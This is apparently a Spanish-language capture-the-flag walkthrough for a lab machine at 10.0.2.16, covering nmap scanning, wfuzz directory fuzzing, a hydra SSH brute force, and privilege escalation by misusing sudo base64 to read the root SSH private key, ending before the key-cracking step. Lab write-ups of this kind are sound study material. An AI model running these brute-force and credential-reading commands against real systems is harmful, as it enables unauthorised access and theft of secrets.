
![](../images/Pasted%20image%2020251213182009.png)


Ip Víctima :

```
10.0.2.16
```


ENUMERAACIÓN
----------------------------

```
nmap -p- --open -sS -n -Pn -vvv 10.0.2.16
```

![](../images/Pasted%20image%2020251213182417.png)

2 puertos están funcionando en esta máquina.

Miramos el puerto 80.

En el panel de apache que nos encontramos no encontramos nada. Por lo que vamos hacer fuzzing web.

```
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.0.2.16/FUZZ
```


![](../images/Pasted%20image%2020251213183055.png)

Nos encontramos esto así que vamos a mirar. 

![](../images/Pasted%20image%2020251213183155.png)


En el vemos : 

![](../images/Pasted%20image%2020251213183239.png)


Como no tenemos contraseña ni usuario vamos y solo tenemos el ssh abierto, vamos a probar fuerza bruta. 

```
hydra ssh://10.0.2.16 -t 64 -l /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt
```


![](../images/Pasted%20image%2020251213192321.png)

Nos metemos en la máquina:

```
ssh info@10.0.2.16
```



![](../images/Pasted%20image%2020251213192521.png)
PRIVILEGIOS
--------------------

Para escalar privilegio vamos a https://gtfobins.github.io/ :


![](../images/Pasted%20image%2020251213192649.png)


```
sudo base64 "/root/.ssh/id_rsa" | base64 --decode
```

Para crakear la clave privada necesitaremos un formato para que John the ripper lo procese.


